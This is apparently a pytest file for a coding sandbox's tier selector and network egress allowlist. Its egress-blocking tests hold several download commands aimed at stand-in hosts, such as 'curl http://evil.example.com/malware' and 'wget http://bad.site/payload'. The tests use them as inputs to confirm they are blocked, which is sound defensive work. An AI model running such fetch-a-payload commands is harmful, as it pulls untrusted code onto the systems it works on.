from loom.business.models import OrgTier
from loom.sandbox.tiers import (
    DEFAULT_EGRESS_ALLOWLIST,
    TIER_A_RESOURCE_LIMITS,
    TIER_B_RESOURCE_LIMITS,
    TIER_C_RESOURCE_LIMITS,
    TIER_RESOURCE_MAP,
    EgressEnforcer,
    EgressViolation,
    RunClassification,
    SandboxContext,
    SandboxTier,
    SandboxTierSelector,
)


class TestSandboxContext:
    def test_default_context_is_tier_a(self):
        ctx = SandboxContext(org_tier=OrgTier.SOLO)
        assert ctx.sandbox_tier == SandboxTier.A_GIT_WORKTREE
        assert ctx.resource_limits == TIER_A_RESOURCE_LIMITS

    def test_context_with_enterprise_org(self):
        ctx = SandboxContext(
            org_tier=OrgTier.ENTERPRISE,
            repo_sensitivity_flag=True,
            patch_risk_high=True,
        )
        assert ctx.org_tier == OrgTier.ENTERPRISE
        assert ctx.repo_sensitivity_flag is True


class TestSandboxTierSelector:
    def test_quick_fix_selects_tier_a(self):
        selector = SandboxTierSelector()
        ctx = SandboxContext(
            org_tier=OrgTier.SOLO,
            has_untrusted_native_deps=False,
            classification=RunClassification.QUICK_FIX,
        )
        tier = selector.select_tier(ctx)
        assert tier == SandboxTier.A_GIT_WORKTREE

    def test_team_dependency_install_selects_tier_b(self):
        selector = SandboxTierSelector()
        ctx = SandboxContext(
            org_tier=OrgTier.TEAM,
            requires_dependency_install=True,
            classification=RunClassification.STANDARD,
        )
        tier = selector.select_tier(ctx)
        assert tier == SandboxTier.B_DOCKER_CONTAINER

    def test_enterprise_high_risk_selects_tier_c(self):
        selector = SandboxTierSelector()
        ctx = SandboxContext(
            org_tier=OrgTier.ENTERPRISE,
            repo_sensitivity_flag=True,
            classification=RunClassification.HIGH_RISK,
        )
        tier = selector.select_tier(ctx)
        assert tier == SandboxTier.C_FIRECRACKER_MICROVM

    def test_enterprise_patch_risk_high_selects_tier_c(self):
        selector = SandboxTierSelector()
        ctx = SandboxContext(
            org_tier=OrgTier.ENTERPRISE,
            patch_risk_high=True,
            classification=RunClassification.STANDARD,
        )
        tier = selector.select_tier(ctx)
        assert tier == SandboxTier.C_FIRECRACKER_MICROVM

    def test_solo_dependency_install_defaults_tier_a(self):
        selector = SandboxTierSelector()
        ctx = SandboxContext(
            org_tier=OrgTier.SOLO,
            requires_dependency_install=True,
            classification=RunClassification.STANDARD,
        )
        tier = selector.select_tier(ctx)
        assert tier == SandboxTier.A_GIT_WORKTREE

    def test_untrusted_deps_selects_tier_b_for_team(self):
        selector = SandboxTierSelector()
        ctx = SandboxContext(
            org_tier=OrgTier.TEAM,
            has_untrusted_native_deps=True,
            classification=RunClassification.QUICK_FIX,
            requires_dependency_install=True,
        )
        tier = selector.select_tier(ctx)
        assert tier == SandboxTier.B_DOCKER_CONTAINER

    def test_select_with_resources_sets_limits(self):
        selector = SandboxTierSelector()
        ctx = SandboxContext(
            org_tier=OrgTier.ENTERPRISE,
            repo_sensitivity_flag=True,
        )
        result = selector.select_with_resources(ctx)
        assert result.sandbox_tier == SandboxTier.C_FIRECRACKER_MICROVM
        assert result.resource_limits["cpu_cores"] == 4
        assert result.resource_limits["memory_mb"] == 8192

    def test_select_with_resources_tier_a_limits(self):
        selector = SandboxTierSelector()
        ctx = SandboxContext(
            org_tier=OrgTier.SOLO,
            classification=RunClassification.QUICK_FIX,
        )
        result = selector.select_with_resources(ctx)
        assert result.resource_limits["cpu_cores"] == 1
        assert result.resource_limits["memory_mb"] == 2048

    def test_select_with_resources_sets_default_egress(self):
        selector = SandboxTierSelector()
        ctx = SandboxContext(org_tier=OrgTier.SOLO)
        result = selector.select_with_resources(ctx)
        assert result.egress_allowlist is not None
        assert "pypi.org" in result.egress_allowlist

    def test_create_sandbox_all_tiers_return_sandbox(self):
        selector = SandboxTierSelector()
        for tier in SandboxTier:
            ctx = SandboxContext(org_tier=OrgTier.ENTERPRISE)
            ctx.sandbox_tier = tier
            sandbox = selector.create_sandbox(ctx, ".")
            assert sandbox is not None

    def test_enforce_egress_allows_whitelisted_domains(self):
        selector = SandboxTierSelector()
        ctx = SandboxContext(org_tier=OrgTier.TEAM)
        ctx = selector.select_with_resources(ctx)
        allowed = selector.enforce_egress_policy("pip install requests", ctx)
        assert allowed is True

    def test_enforce_egress_blocks_unlisted_domain(self):
        selector = SandboxTierSelector()
        ctx = SandboxContext(org_tier=OrgTier.TEAM)
        ctx = selector.select_with_resources(ctx)
        blocked = selector.enforce_egress_policy("curl http://evil.example.com/malware", ctx)
        assert blocked is False

    def test_enforce_egress_violation_callback(self):
        violations = []

        def on_violation(v):
            violations.append(v)

        selector = SandboxTierSelector()
        ctx = SandboxContext(org_tier=OrgTier.TEAM)
        ctx = selector.select_with_resources(ctx)
        result = selector.enforce_egress_policy("wget http://bad.site/payload", ctx, on_violation=on_violation)
        assert result is False
        assert len(violations) == 1
        assert violations[0].target == "bad.site"


class TestEgressEnforcer:
    def test_check_egress_allows_pypi(self):
        enforcer = EgressEnforcer()
        assert enforcer.check_egress("pypi.org", "pip install x", SandboxTier.A_GIT_WORKTREE) is True

    def test_check_egress_allows_github(self):
        enforcer = EgressEnforcer()
        assert enforcer.check_egress("github.com", "git clone", SandboxTier.B_DOCKER_CONTAINER) is True

    def test_check_egress_blocks_unknown(self):
        enforcer = EgressEnforcer()
        assert enforcer.check_egress("evil.com", "curl evil.com", SandboxTier.A_GIT_WORKTREE) is False

    def test_check_egress_case_insensitive(self):
        enforcer = EgressEnforcer()
        assert enforcer.check_egress("PYPI.ORG", "pip install", SandboxTier.A_GIT_WORKTREE) is True

    def test_check_egress_partial_match(self):
        enforcer = EgressEnforcer()
        assert enforcer.check_egress("files.pythonhosted.org/packages/x", "pip install", SandboxTier.A_GIT_WORKTREE) is True

    def test_check_egress_records_violation(self):
        enforcer = EgressEnforcer()
        assert enforcer.violation_count == 0
        enforcer.check_egress("bad.com", "curl bad.com", SandboxTier.A_GIT_WORKTREE)
        assert enforcer.violation_count == 1

    def test_check_command_egress_extracts_urls(self):
        enforcer = EgressEnforcer()
        blocked = enforcer.check_command_egress("curl https://evil.com/malware && wget https://bad.org/x", SandboxTier.A_GIT_WORKTREE)
        assert len(blocked) == 2
        assert "evil.com" in blocked
        assert "bad.org" in blocked

    def test_check_command_egress_allows_valid_urls(self):
        enforcer = EgressEnforcer()
        blocked = enforcer.check_command_egress("pip install --index-url https://pypi.org/simple/ requests", SandboxTier.A_GIT_WORKTREE)
        assert len(blocked) == 0

    def test_check_command_egress_no_urls(self):
        enforcer = EgressEnforcer()
        blocked = enforcer.check_command_egress("ls -la", SandboxTier.A_GIT_WORKTREE)
        assert len(blocked) == 0

    def test_custom_allowlist(self):
        enforcer = EgressEnforcer(allowlist={"custom-registry.internal"})
        assert enforcer.check_egress("custom-registry.internal", "docker pull", SandboxTier.A_GIT_WORKTREE) is True
        assert enforcer.check_egress("pypi.org", "pip install", SandboxTier.A_GIT_WORKTREE) is False

    def test_audit_logger_records_violations(self, tmp_path):
        from loom.business.audit_log import AuditLogger
        from loom.business.models import AuditAction

        audit = AuditLogger(storage_dir=str(tmp_path))
        enforcer = EgressEnforcer(audit_logger=audit)
        enforcer.check_egress("evil.com", "curl evil.com", SandboxTier.A_GIT_WORKTREE)
        entries = audit.get_entries(action=AuditAction.SANDBOX_EGRESS_BLOCKED)
        assert len(entries) == 1
        assert entries[0].target == "evil.com"


class TestResourceLimits:
    def test_tier_map_has_all_tiers(self):
        assert len(TIER_RESOURCE_MAP) == 3
        assert SandboxTier.A_GIT_WORKTREE in TIER_RESOURCE_MAP
        assert SandboxTier.B_DOCKER_CONTAINER in TIER_RESOURCE_MAP
        assert SandboxTier.C_FIRECRACKER_MICROVM in TIER_RESOURCE_MAP

    def test_tier_b_has_more_resources_than_a(self):
        assert TIER_B_RESOURCE_LIMITS["cpu_cores"] >= TIER_A_RESOURCE_LIMITS["cpu_cores"]
        assert TIER_B_RESOURCE_LIMITS["memory_mb"] >= TIER_A_RESOURCE_LIMITS["memory_mb"]

    def test_tier_c_has_more_resources_than_b(self):
        assert TIER_C_RESOURCE_LIMITS["cpu_cores"] >= TIER_B_RESOURCE_LIMITS["cpu_cores"]
        assert TIER_C_RESOURCE_LIMITS["memory_mb"] >= TIER_B_RESOURCE_LIMITS["memory_mb"]

    def test_default_egress_includes_common_registries(self):
        assert "pypi.org" in DEFAULT_EGRESS_ALLOWLIST
        assert "registry.npmjs.org" in DEFAULT_EGRESS_ALLOWLIST
        assert "github.com" in DEFAULT_EGRESS_ALLOWLIST
        assert "crates.io" in DEFAULT_EGRESS_ALLOWLIST


class TestRunClassification:
    def test_classification_enum_values(self):
        assert RunClassification.QUICK_FIX.value == "quick_fix"
        assert RunClassification.STANDARD.value == "standard"
        assert RunClassification.HIGH_RISK.value == "high_risk"


class TestEgressViolation:
    def test_violation_fields(self):
        v = EgressViolation(target="evil.com", command="curl evil.com", tier=SandboxTier.A_GIT_WORKTREE)
        assert v.target == "evil.com"
        assert v.command == "curl evil.com"
        assert v.tier == SandboxTier.A_GIT_WORKTREE
